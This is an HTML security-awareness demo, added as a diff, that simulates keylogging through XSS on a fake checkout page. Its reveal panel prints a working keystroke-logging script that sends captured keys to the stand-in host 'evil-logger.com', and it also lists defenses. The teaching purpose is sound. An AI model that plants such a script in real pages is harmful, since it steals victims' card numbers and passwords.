@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔐 Security Awareness: Keylogging Demo</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0f1117; color: #e2e8f0; min-height: 100vh; }
+
+  /* ── INTRO ── */
+  #intro-banner {
+    position: fixed; inset: 0; z-index: 9999;
+    background: #0f1117;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    gap: 20px; padding: 32px; text-align: center;
+  }
+  .badge { background: #ff4444; color: #fff; font-size: 11px; font-weight: 700; letter-spacing: 2px; padding: 4px 12px; border-radius: 20px; display: inline-block; }
+  #intro-banner h1 { font-size: clamp(24px, 5vw, 40px); font-weight: 700; color: #fff; }
+  #intro-banner p { color: #94a3b8; max-width: 540px; line-height: 1.6; font-size: 15px; }
+  .warning-box { background: rgba(255,68,68,.08); border: 1px solid rgba(255,68,68,.3); border-radius: 10px; padding: 14px 20px; font-size: 13px; color: #fca5a5; max-width: 480px; line-height: 1.6; }
+  .btn-start { margin-top: 8px; background: #3b82f6; color: #fff; border: none; padding: 14px 36px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background .2s; }
+  .btn-start:hover { background: #2563eb; }
+
+  /* ── FAKE SITE ── */
+  #fake-site { display: none; min-height: 100vh; background: #f8fafc; color: #1e293b; }
+  .nav { background: #7c3aed; padding: 0 32px; display: flex; align-items: center; gap: 24px; height: 56px; }
+  .nav-logo { font-size: 18px; font-weight: 700; color: #fff; }
+  .nav a { color: rgba(255,255,255,.8); text-decoration: none; font-size: 14px; }
+  .nav-right { margin-left: auto; display: flex; gap: 12px; align-items: center; }
+  .nav-avatar { width: 32px; height: 32px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; color: #7c3aed; }
+
+  .site-body { display: grid; grid-template-columns: 1fr 1fr; gap: 0; min-height: calc(100vh - 56px); }
+
+  /* Left – checkout form */
+  .checkout-panel { padding: 36px; border-right: 1px solid #e2e8f0; }
+  .checkout-panel h2 { font-size: 20px; font-weight: 700; margin-bottom: 6px; }
+  .checkout-panel .sub { font-size: 13px; color: #64748b; margin-bottom: 24px; }
+  .form-section { margin-bottom: 24px; }
+  .form-section h3 { font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: .5px; color: #7c3aed; margin-bottom: 14px; border-bottom: 1px solid #ede9fe; padding-bottom: 6px; }
+  .field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  .field { margin-bottom: 14px; }
+  .field label { font-size: 12px; font-weight: 600; color: #475569; display: block; margin-bottom: 5px; }
+  .field input, .field select {
+    width: 100%; padding: 10px 12px;
+    border: 1.5px solid #e2e8f0; border-radius: 8px;
+    font-size: 14px; color: #0f172a; outline: none;
+    transition: border-color .2s; background: #fff;
+  }
+  .field input:focus, .field select:focus { border-color: #7c3aed; }
+  .field input.sensitive { border-color: #e2e8f0; }
+  .pay-btn { width: 100%; padding: 13px; background: #7c3aed; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background .2s; }
+  .pay-btn:hover { background: #6d28d9; }
+  .secure-note { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #94a3b8; justify-content: center; margin-top: 10px; }
+
+  /* Right – attacker's live feed */
+  .spy-panel {
+    background: #0d0d0d; padding: 24px;
+    display: flex; flex-direction: column;
+    position: relative;
+  }
+  .spy-header { display: flex; align-items: center; gap: 10px; margin-bottom: 16px; }
+  .spy-dot { width: 10px; height: 10px; border-radius: 50%; background: #ff4444; animation: pulse 1s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
+  .spy-title { font-size: 13px; font-weight: 700; color: #ff4444; letter-spacing: 1px; font-family: monospace; }
+  .spy-subtitle { font-size: 11px; color: #4a5568; font-family: monospace; }
+
+  .keystream {
+    flex: 1; background: #0a0a0a; border: 1px solid #1a1a1a;
+    border-radius: 8px; padding: 14px; font-family: monospace;
+    font-size: 13px; overflow-y: auto; min-height: 200px;
+    line-height: 1.8;
+  }
+  .key-char { color: #a6e3a1; }
+  .key-special { color: #89b4fa; font-style: italic; font-size: 11px; }
+  .key-sensitive { color: #f9e2af; }
+  .cursor { display: inline-block; width: 8px; height: 14px; background: #a6e3a1; animation: blink .7s infinite; vertical-align: middle; margin-left: 2px; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+  /* reconstructed fields */
+  .recon-section { margin-top: 16px; }
+  .recon-title { font-size: 11px; color: #4a5568; font-family: monospace; margin-bottom: 10px; letter-spacing: 1px; }
+  .recon-field { background: #111; border: 1px solid #1e1e1e; border-radius: 6px; padding: 10px 14px; margin-bottom: 8px; font-family: monospace; font-size: 12px; }
+  .recon-field .rf-label { color: #6c7086; font-size: 10px; margin-bottom: 3px; }
+  .recon-field .rf-value { color: #cdd6f4; word-break: break-all; min-height: 16px; }
+  .recon-field .rf-value.active { color: #f9e2af; }
+
+  .stats-row { display: flex; gap: 12px; margin-top: 14px; }
+  .stat-box { flex: 1; background: #111; border: 1px solid #1a1a1a; border-radius: 6px; padding: 10px; text-align: center; }
+  .stat-box .sv { font-size: 22px; font-weight: 700; color: #f38ba8; font-family: monospace; }
+  .stat-box .sl { font-size: 10px; color: #4a5568; margin-top: 2px; }
+
+  /* ── REVEAL PANEL ── */
+  #reveal-panel { display: none; position: fixed; inset: 0; z-index: 9000; background: #0f1117; overflow-y: auto; padding: 40px 20px; }
+  .reveal-inner { max-width: 800px; margin: 0 auto; }
+  .reveal-inner h2 { font-size: 28px; font-weight: 700; margin-bottom: 8px; color: #f8fafc; }
+  .reveal-inner .sub { color: #94a3b8; margin-bottom: 28px; font-size: 14px; }
+
+  .captured-box { background: #1a0a0a; border: 1px solid #ff4444; border-radius: 12px; padding: 20px 24px; margin-bottom: 28px; }
+  .captured-box h3 { color: #ff4444; font-size: 12px; letter-spacing: 1px; margin-bottom: 16px; font-family: monospace; }
+  .kv { display: flex; gap: 12px; margin-bottom: 10px; font-size: 14px; }
+  .kv .k { color: #94a3b8; min-width: 140px; font-size: 12px; }
+  .kv .v { color: #f8fafc; font-family: monospace; word-break: break-all; }
+  .kv .v.danger { color: #fbbf24; }
+
+  .code-block { background: #1e1e2e; border-radius: 10px; padding: 18px 20px; font-family: monospace; font-size: 13px; color: #cdd6f4; overflow-x: auto; margin-bottom: 16px; border: 1px solid #313244; line-height: 1.8; }
+  .c-green { color: #a6e3a1; } .c-blue { color: #89b4fa; } .c-yellow { color: #f9e2af; } .c-red { color: #f38ba8; } .c-gray { color: #6c7086; } .c-purple { color: #cba6f7; }
+
+  .steps { counter-reset: step; list-style: none; }
+  .steps li { counter-increment: step; position: relative; padding: 0 0 24px 48px; }
+  .steps li::before { content: counter(step); position: absolute; left: 0; top: 0; width: 30px; height: 30px; border-radius: 50%; background: #7c3aed; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; }
+  .steps li h4 { font-size: 15px; font-weight: 600; margin-bottom: 5px; color: #f8fafc; }
+  .steps li p { font-size: 13px; color: #94a3b8; line-height: 1.6; }
+
+  .defenses { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; margin-top: 20px; }
+  .def-card { background: #0d1a2e; border: 1px solid #1e3a5f; border-radius: 10px; padding: 16px; }
+  .def-card .icon { font-size: 22px; margin-bottom: 8px; }
+  .def-card h4 { font-size: 14px; font-weight: 600; color: #93c5fd; margin-bottom: 4px; }
+  .def-card p { font-size: 12px; color: #64748b; line-height: 1.5; }
+
+  .section-title { font-size: 16px; font-weight: 700; color: #f8fafc; margin: 28px 0 14px; }
+  .btn-restart { display: inline-block; margin-top: 28px; background: #7c3aed; color: #fff; border: none; padding: 12px 28px; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; }
+
+  /* active field highlight */
+  .field input:focus { box-shadow: 0 0 0 3px rgba(124,58,237,.15); }
+
+  /* field being spied indicator */
+  .field.spying label::after { content: ' 👁'; font-size: 11px; }
+
+  @media (max-width: 700px) {
+    .site-body { grid-template-columns: 1fr; }
+    .spy-panel { min-height: 300px; }
+    .field-row { grid-template-columns: 1fr; }
+  }
+
+  #intro-banner > *:not(.cyber-bg), #reveal-panel > *:not(.cyber-bg) {
+    position: relative;
+    z-index: 1;
+  }
+
+/* ---------- DYNAMIC CYBER BACKGROUND ---------- */
+  .cyber-bg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    pointer-events: none;
+    z-index: 0;
+    overflow: hidden;
+  }
+
+  /* Matrix Dot Grid Overlay with continuous slow drift */
+  .cyber-grid {
+    position: absolute;
+    inset: -120px;
+    background-image: 
+      radial-gradient(rgba(255, 255, 255, 0.12) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    background-size: 32px 32px, 96px 96px, 96px 96px;
+    -webkit-mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
+    mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
+    opacity: 0.85;
+    animation: gridDrift 60s linear infinite;
+  }
+  :root[data-theme="light"] .cyber-grid {
+    background-image: 
+      radial-gradient(rgba(15, 23, 42, 0.08) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    opacity: 0.6;
+  }
+
+  @keyframes gridDrift {
+    0% { transform: translate(0, 0); }
+    100% { transform: translate(96px, 96px); }
+  }
+
+  /* Ambient Glowing Floating Orbs */
+  .cyber-orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(100px);
+    opacity: 0.35;
+    will-change: transform;
+  }
+  :root[data-theme="light"] .cyber-orb {
+    opacity: 0.18;
+    filter: blur(110px);
+  }
+
+  .orb-1 {
+    width: 650px;
+    height: 650px;
+    background: radial-gradient(circle, #6366f1 0%, rgba(99,102,241,0) 70%);
+    top: -120px;
+    left: -100px;
+    animation: floatOrb1 16s ease-in-out infinite alternate;
+  }
+
+  .orb-2 {
+    width: 700px;
+    height: 700px;
+    background: radial-gradient(circle, #a855f7 0%, rgba(168,85,247,0) 70%);
+    top: 15%;
+    right: -150px;
+    animation: floatOrb2 20s ease-in-out infinite alternate;
+  }
+
+  .orb-3 {
+    width: 560px;
+    height: 560px;
+    background: radial-gradient(circle, #06b6d4 0%, rgba(6,182,212,0) 70%);
+    bottom: -80px;
+    left: 15%;
+    animation: floatOrb3 18s ease-in-out infinite alternate;
+  }
+
+  .orb-4 {
+    width: 500px;
+    height: 500px;
+    background: radial-gradient(circle, #f43f5e 0%, rgba(244,63,94,0) 70%);
+    bottom: 18%;
+    right: 12%;
+    animation: floatOrb4 22s ease-in-out infinite alternate;
+  }
+
+  /* Keyframe Animations for Smooth Floating */
+  @keyframes floatOrb1 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(120px, 90px) scale(1.15); }
+    100% { transform: translate(-60px, 140px) scale(0.92); }
+  }
+
+  @keyframes floatOrb2 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(-140px, 110px) scale(1.18); }
+    100% { transform: translate(-80px, -70px) scale(0.9); }
+  }
+
+  @keyframes floatOrb3 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(90px, -100px) scale(1.14); }
+    100% { transform: translate(-100px, -50px) scale(1.05); }
+  }
+
+  @keyframes floatOrb4 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(-110px, -80px) scale(1.2); }
+    100% { transform: translate(90px, 70px) scale(0.9); }
+  }
+
+  /* Floating Cyber Data Particles */
+  .cyber-particle {
+    position: absolute;
+    border-radius: 50%;
+    background: #fff;
+    box-shadow: 0 0 8px currentColor;
+    opacity: 0;
+    animation: floatParticle 14s infinite ease-in-out;
+  }
+
+  .p-1 { width: 3px; height: 3px; left: 12%; bottom: -20px; color: var(--brand-1); animation-delay: 0s; animation-duration: 15s; }
+  .p-2 { width: 4px; height: 4px; left: 28%; bottom: -20px; color: var(--brand-2); animation-delay: 3s; animation-duration: 18s; }
+  .p-3 { width: 3px; height: 3px; left: 48%; bottom: -20px; color: var(--safe); animation-delay: 6s; animation-duration: 14s; }
+  .p-4 { width: 4px; height: 4px; left: 68%; bottom: -20px; color: var(--danger); animation-delay: 2s; animation-duration: 20s; }
+  .p-5 { width: 3px; height: 3px; left: 84%; bottom: -20px; color: var(--accent); animation-delay: 7s; animation-duration: 16s; }
+  .p-6 { width: 4px; height: 4px; left: 94%; bottom: -20px; color: #38bdf8; animation-delay: 4s; animation-duration: 19s; }
+  .p-7 { width: 3px; height: 3px; left: 38%; bottom: -20px; color: var(--safe); animation-delay: 9s; animation-duration: 17s; }
+  .p-8 { width: 4px; height: 4px; left: 58%; bottom: -20px; color: var(--brand-2); animation-delay: 11s; animation-duration: 21s; }
+
+  @keyframes floatParticle {
+    0% { transform: translateY(0) translateX(0) scale(0.5); opacity: 0; }
+    15% { opacity: 0.8; }
+    85% { opacity: 0.8; }
+    100% { transform: translateY(-105vh) translateX(50px) scale(1.2); opacity: 0; }
+  }
+
+  /* Scanline sweep effect */
+  .cyber-scanline {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(180deg, transparent 0%, rgba(99, 102, 241, 0.035) 50%, transparent 100%);
+    background-size: 100% 200%;
+    animation: scanSweep 12s linear infinite;
+  }
+
+  @keyframes scanSweep {
+    0% { background-position: 0% 0%; }
+    100% { background-position: 0% 200%; }
+  }
+
+
+  /* ── Moving Interactive Pipeline Stream (Visual Motion) ── */
+  .flow-stream-bar {
+    background: rgba(17, 24, 39, 0.7);
+    border: 1px solid var(--border, #374151);
+    border-radius: 10px;
+    padding: 12px 18px;
+    margin-bottom: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+    overflow: hidden;
+  }
+  .flow-stream-bar::after {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 60%; height: 2px;
+    background: linear-gradient(90deg, transparent, #38bdf8, #ef4444, transparent);
+    animation: pipelineLaser 3s linear infinite;
+  }
+  @keyframes pipelineLaser {
+    0% { left: -60%; }
+    100% { left: 140%; }
+  }
+
+  .flow-step-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: var(--mono, monospace);
+    font-size: 12px;
+    color: var(--text-muted, #9ca3af);
+    transition: all 0.3s;
+  }
+  .flow-step-item.active {
+    color: #38bdf8;
+    text-shadow: 0 0 10px rgba(56, 189, 248, 0.4);
+  }
+  .flow-step-item.attacked {
+    color: #f87171;
+    text-shadow: 0 0 10px rgba(239, 68, 68, 0.6);
+  }
+  .flow-dot-pulse {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: #3b82f6;
+    animation: dotPulse 1.5s infinite alternate;
+  }
+  .flow-step-item.attacked .flow-dot-pulse {
+    background: #ef4444;
+    animation: dotPulseRed 0.8s infinite alternate;
+  }
+  @keyframes dotPulse {
+    0% { transform: scale(0.8); opacity: 0.5; }
+    100% { transform: scale(1.4); opacity: 1; box-shadow: 0 0 8px #3b82f6; }
+  }
+  @keyframes dotPulseRed {
+    0% { transform: scale(0.8); opacity: 0.6; }
+    100% { transform: scale(1.6); opacity: 1; box-shadow: 0 0 12px #ef4444; }
+  }
+  .flow-connector {
+    color: #4b5563;
+    font-weight: 700;
+    font-size: 13px;
+  }
+
+  /* Live Bouncing Waveform Monitor */
+  .parser-heartbeat {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: #080c14;
+    border: 1px solid var(--border, #374151);
+    border-radius: 6px;
+    padding: 8px 12px;
+    margin-top: 14px;
+    font-family: var(--mono, monospace);
+    font-size: 11px;
+    color: #94a3b8;
+  }
+  .wave-bars {
+    display: flex;
+    align-items: flex-end;
+    gap: 3px;
+    height: 14px;
+  }
+  .wave-bar {
+    width: 3px;
+    background: #3b82f6;
+    border-radius: 1px;
+    animation: waveBounce 1s ease-in-out infinite alternate;
+  }
+  .wave-bar:nth-child(2) { animation-delay: 0.2s; }
+  .wave-bar:nth-child(3) { animation-delay: 0.4s; }
+  .wave-bar:nth-child(4) { animation-delay: 0.6s; }
+  @keyframes waveBounce {
+    0% { height: 3px; }
+    100% { height: 14px; background: #ef4444; }
+  }
+
+  .term-cursor {
+    display: inline-block;
+    width: 7px;
+    height: 14px;
+    background: #a3e635;
+    vertical-align: middle;
+    margin-left: 4px;
+    animation: blinkCursor 0.9s step-end infinite;
+  }
+  @keyframes blinkCursor {
+    50% { opacity: 0; }
+  }
+
+
+  /* ── Standard Modern Footer ── */
+  .modern-footer { padding: 40px 18px 30px; text-align: center; position: relative; z-index: 1; }
+  .footer-badge {
+    display: inline-flex; align-items: center; gap: 10px;
+    background: linear-gradient(145deg, #1f2937, #111827);
+    padding: 12px 28px; border-radius: 30px; font-family: 'IBM Plex Mono', monospace; font-size: 13.5px;
+    color: #9ca3af; border: 1px solid #374151;
+    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.25); cursor: default;
+  }
+  .footer-badge:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 30px rgba(239, 68, 68, 0.25);
+    border-color: #ef4444;
+    color: #f9fafb;
+  }
+  .dev-name {
+    font-family: 'Poppins', sans-serif;
+    font-weight: 700;
+    font-size: 1.05rem;
+    background: linear-gradient(90deg, #3B82F6, #A855F7, #F43F5E, #F59E0B, #3B82F6);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    background-size: 200% auto;
+    animation: gradient-flow 4s linear infinite;
+  }
+  @keyframes gradient-flow {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
+
+
+  /* ── Back to Notes Navigation Link ── */
+  .back-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 16px;
+    background: var(--panel, #111827);
+    border: 1px solid var(--border, #374151);
+    border-radius: 8px;
+    color: var(--text-muted, #9ca3af);
+    font-family: var(--mono, monospace);
+    font-size: 13px;
+    text-decoration: none;
+    transition: all 0.2s;
+  }
+  .back-link:hover {
+    color: var(--text, #f9fafb);
+    border-color: var(--accent, #f59e0b);
+    transform: translateX(-3px);
+  }
+
+</style>
+</head>
+<body>
+
+<!-- ═══ PHASE 0 – INTRO ═══ -->
+<div id="intro-banner">
+<!-- ================= DYNAMIC CYBER BACKGROUND ================= -->
+<div class="cyber-bg" aria-hidden="true">
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+  <div class="cyber-grid"></div>
+  <div class="cyber-scanline"></div>
+  <div class="cyber-particle p-1"></div>
+  <div class="cyber-particle p-2"></div>
+  <div class="cyber-particle p-3"></div>
+  <div class="cyber-particle p-4"></div>
+  <div class="cyber-particle p-5"></div>
+  <div class="cyber-particle p-6"></div>
+  <div class="cyber-particle p-7"></div>
+  <div class="cyber-particle p-8"></div>
+</div>
+
+
+  <div style="margin-bottom: 20px;"><a href="../guides/XSS.html" class="back-link">← Back to XSS Notes</a></div>
+  <div class="badge">🛡 SECURITY AWARENESS TRAINING</div>
+  <h1>Keylogging via XSS</h1>
+  <p>This demo shows how an attacker silently records every keystroke using a single injected <code style="background:#1e1e2e;padding:2px 6px;border-radius:4px;font-size:13px">addEventListener('keypress')</code> — capturing credit cards, passwords, and messages in real time.</p>
+  <div class="warning-box">
+    ⚠️ <strong>Educational use only.</strong> No data leaves your browser.
+    The "attacker panel" is just JavaScript running locally for demonstration.
+  </div>
+  <button class="btn-start" onclick="startSim()">▶ Start Simulation</button>
+</div>
+
+<!-- ═══ PHASE 1 – FAKE SITE + SPY PANEL ═══ -->
+<div id="fake-site">
+  <div class="nav">
+    <div class="nav-logo">🛒 ShopVault</div>
+    <a href="#">Home</a><a href="#">Products</a><a href="#">Orders</a>
+    <div class="nav-right">
+      <span style="font-size:13px;color:rgba(255,255,255,.7)">shabaj.ansari@gmail.com</span>
+      <div class="nav-avatar">SA</div>
+    </div>
+  </div>
+
+  <div class="site-body">
+
+    <!-- LEFT: Checkout Form (victim sees this) -->
+    <div class="checkout-panel">
+      <h2>Secure Checkout</h2>
+      <div class="sub">Complete your purchase safely</div>
+
+      <div class="form-section">
+        <h3>📦 Shipping Details</h3>
+        <div class="field-row">
+          <div class="field" id="f-fname">
+            <label>First Name</label>
+            <input type="text" id="i-fname" placeholder="Shabaj" autocomplete="off">
+          </div>
+          <div class="field" id="f-lname">
+            <label>Last Name</label>
+            <input type="text" id="i-lname" placeholder="Ansari" autocomplete="off">
+          </div>
+        </div>
+        <div class="field" id="f-addr">
+          <label>Address</label>
+          <input type="text" id="i-addr" placeholder="123 MG Road, Bengaluru" autocomplete="off">
+        </div>
+        <div class="field" id="f-phone">
+          <label>Phone Number</label>
+          <input type="tel" id="i-phone" placeholder="+91 98765 43210" autocomplete="off">
+        </div>
+      </div>
+
+      <div class="form-section">
+        <h3>💳 Payment Details</h3>
+        <div class="field sensitive" id="f-card">
+          <label>Card Number</label>
+          <input type="text" id="i-card" placeholder="4111 1111 1111 1111" maxlength="19" autocomplete="off">
+        </div>
+        <div class="field-row">
+          <div class="field" id="f-expiry">
+            <label>Expiry</label>
+            <input type="text" id="i-expiry" placeholder="MM/YY" maxlength="5" autocomplete="off">
+          </div>
+          <div class="field" id="f-cvv">
+            <label>CVV</label>
+            <input type="password" id="i-cvv" placeholder="•••" maxlength="3" autocomplete="off">
+          </div>
+        </div>
+        <div class="field" id="f-name">
+          <label>Name on Card</label>
+          <input type="text" id="i-name" placeholder="SHABAJ ANSARI" autocomplete="off">
+        </div>
+      </div>
+
+      <button class="pay-btn" onclick="showReveal()">🔒 Pay ₹4,299 Securely</button>
+      <div class="secure-note">🔐 256-bit SSL Encrypted · PCI DSS Compliant</div>
+    </div>
+
+    <!-- RIGHT: Attacker's live feed (hidden to victim IRL) -->
+    <div class="spy-panel">
+      <div class="spy-header">
+        <div class="spy-dot"></div>
+        <div>
+          <div class="spy-title">ATTACKER CONSOLE — LIVE FEED</div>
+          <div class="spy-subtitle">keylogger.js · listening on document · victim unaware</div>
+        </div>
+      </div>
+
+      <!-- Raw key stream -->
+      <div class="keystream" id="keystream">
+        <span style="color:#4a5568;font-family:monospace;font-size:12px">// Waiting for keystrokes...</span>
+        <span class="cursor"></span>
+      </div>
+
+      <!-- Reconstructed fields -->
+      <div class="recon-section">
+        <div class="recon-title">// RECONSTRUCTED FIELDS (auto-parsed)</div>
+        <div class="recon-field"><div class="rf-label">SHIPPING NAME</div><div class="rf-value" id="r-name">—</div></div>
+        <div class="recon-field"><div class="rf-label">PHONE</div><div class="rf-value" id="r-phone">—</div></div>
+        <div class="recon-field"><div class="rf-label">💳 CARD NUMBER</div><div class="rf-value active" id="r-card">—</div></div>
+        <div class="recon-field"><div class="rf-label">EXPIRY / CVV</div><div class="rf-value active" id="r-exp-cvv">—</div></div>
+      </div>
+
+      <div class="stats-row">
+        <div class="stat-box"><div class="sv" id="stat-keys">0</div><div class="sl">keys captured</div></div>
+        <div class="stat-box"><div class="sv" id="stat-fields">0</div><div class="sl">fields logged</div></div>
+        <div class="stat-box"><div class="sv" id="stat-sensitive">0</div><div class="sl">sensitive keys</div></div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══ PHASE 2 – REVEAL ═══ -->
+<div id="reveal-panel">
+<!-- ================= DYNAMIC CYBER BACKGROUND ================= -->
+<div class="cyber-bg" aria-hidden="true">
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+  <div class="cyber-grid"></div>
+  <div class="cyber-scanline"></div>
+  <div class="cyber-particle p-1"></div>
+  <div class="cyber-particle p-2"></div>
+  <div class="cyber-particle p-3"></div>
+  <div class="cyber-particle p-4"></div>
+  <div class="cyber-particle p-5"></div>
+  <div class="cyber-particle p-6"></div>
+  <div class="cyber-particle p-7"></div>
+  <div class="cyber-particle p-8"></div>
+</div>
+
+
+  <div class="reveal-inner">
+    <div class="badge">⚠ KEYLOGGER CAPTURED EVERYTHING</div>
+    <h2 style="margin-top:16px">Every keystroke was recorded.</h2>
+    <div class="sub">Here's what the attacker received — silently, in real time.</div>
+
+    <div class="captured-box">
+      <h3>📡 DATA EXFILTRATED TO ATTACKER'S SERVER</h3>
+      <div class="kv"><span class="k">Endpoint:</span><span class="v danger">https://evil-logger.com/keys</span></div>
+      <div class="kv"><span class="k">Total Keystrokes:</span><span class="v" id="o-keys">—</span></div>
+      <div class="kv"><span class="k">Card Number:</span><span class="v danger" id="o-card">—</span></div>
+      <div class="kv"><span class="k">Expiry:</span><span class="v danger" id="o-expiry">—</span></div>
+      <div class="kv"><span class="k">CVV:</span><span class="v danger" id="o-cvv">—</span></div>
+      <div class="kv"><span class="k">Name on Card:</span><span class="v" id="o-name">—</span></div>
+      <div class="kv"><span class="k">Full Key Log:</span><span class="v" id="o-log" style="color:#6c7086;font-size:11px;max-width:400px;word-break:break-all">—</span></div>
+    </div>
+
+    <div class="section-title">🧬 The Malicious Keylogger Script</div>
+    <div class="code-block">
+<span class="c-gray">// Injected silently via XSS — one line is enough to start stealing</span>
+
+<span class="c-blue">const</span> <span class="c-yellow">log</span> = [];
+<span class="c-blue">let</span>  <span class="c-yellow">activeField</span> = <span class="c-green">''</span>;
+
+<span class="c-gray">// Track which field the user is typing in</span>
+document.<span class="c-purple">addEventListener</span>(<span class="c-green">'focusin'</span>, e => {
+  activeField = e.target.name || e.target.id || <span class="c-green">'unknown'</span>;
+});
+
+<span class="c-gray">// Capture every single keystroke</span>
+document.<span class="c-purple">addEventListener</span>(<span class="c-green">'keypress'</span>, e => {
+  log.<span class="c-purple">push</span>({ key: e.key, field: activeField, t: Date.now() });
+
+  <span class="c-gray">// Silently batch-send to attacker every 5 seconds</span>
+  <span class="c-purple">sendToEvil</span>(log);
+});
+
+<span class="c-blue">async function</span> <span class="c-purple">sendToEvil</span>(data) {
+  <span class="c-blue">await</span> fetch(<span class="c-red">'https://evil-logger.com/keys'</span>, {
+    method: <span class="c-green">'POST'</span>,
+    body: JSON.<span class="c-purple">stringify</span>(data),
+    <span class="c-gray">// No CORS needed — attacker controls the server</span>
+  });
+}
+    </div>
+
+    <div class="section-title">🔍 Why This Is So Dangerous</div>
+    <ul class="steps">
+      <li>
+        <h4>One listener captures everything</h4>
+        <p>A single <code style="background:#1e1e2e;padding:1px 5px;border-radius:3px">addEventListener</code> on <code style="background:#1e1e2e;padding:1px 5px;border-radius:3px">document</code> catches keystrokes from every input — including password fields, even those with <code style="background:#1e1e2e;padding:1px 5px;border-radius:3px">type="password"</code>.</p>
+      </li>
+      <li>
+        <h4>HTTPS provides zero protection here</h4>
+        <p>The padlock icon means data is encrypted in transit — but keylogging happens before transmission, inside your browser. The attacker reads plaintext.</p>
+      </li>
+      <li>
+        <h4>Silent exfiltration via batched requests</h4>
+        <p>Keys are buffered and sent periodically using <code style="background:#1e1e2e;padding:1px 5px;border-radius:3px">fetch()</code> or <code style="background:#1e1e2e;padding:1px 5px;border-radius:3px">new Image().src</code> (beacon). Network tabs look clean — no obvious suspicious calls.</p>
+      </li>
+      <li>
+        <h4>Context-aware reconstruction</h4>
+        <p>By tracking <code style="background:#1e1e2e;padding:1px 5px;border-radius:3px">focusin</code> events, the attacker knows exactly which field each keystroke belongs to — "card number", "CVV", "password" — without any guesswork.</p>
+      </li>
+    </ul>
+
+    <div class="section-title">🛡 Defenses</div>
+    <div class="defenses">
+      <div class="def-card">
+        <div class="icon">🧩</div>
+        <h4>Strict CSP Headers</h4>
+        <p><code>script-src 'self'</code> prevents inline script injection and blocks unauthorized external JS from running.</p>
+      </div>
+      <div class="def-card">
+        <div class="icon">🏦</div>
+        <h4>Iframe Payment Forms</h4>
+        <p>Stripe, Razorpay etc. load card fields in a sandboxed iframe from a different origin — keyloggers on the parent page can't reach them.</p>
+      </div>
+      <div class="def-card">
+        <div class="icon">🔑</div>
+        <h4>Autofill over Typing</h4>
+        <p>Browser autofill and password managers don't trigger <code>keypress</code> events — attacker gets nothing when users autofill.</p>
+      </div>
+      <div class="def-card">
+        <div class="icon">🛠</div>
+        <h4>Input Sanitization</h4>
+        <p>Prevent XSS at the source — escape user-supplied content server-side so attacker scripts can never be injected in the first place.</p>
+      </div>
+    </div>
+
+    <button class="btn-restart" onclick="restart()">↺ Run Again</button>
+  </div>
+</div>
+
+<script>
+
+function animatePipeline(isAttack) {
+  const count = 5;
+  for (let i = 1; i <= count; i++) {
+    const el = document.getElementById('flow-step-' + i);
+    if (!el) continue;
+    el.className = "flow-step-item";
+    setTimeout(() => {
+      el.className = isAttack ? "flow-step-item attacked" : "flow-step-item active";
+    }, (i - 1) * 120);
+  }
+  const hb = document.getElementById('heartbeat-text');
+  if (hb) {
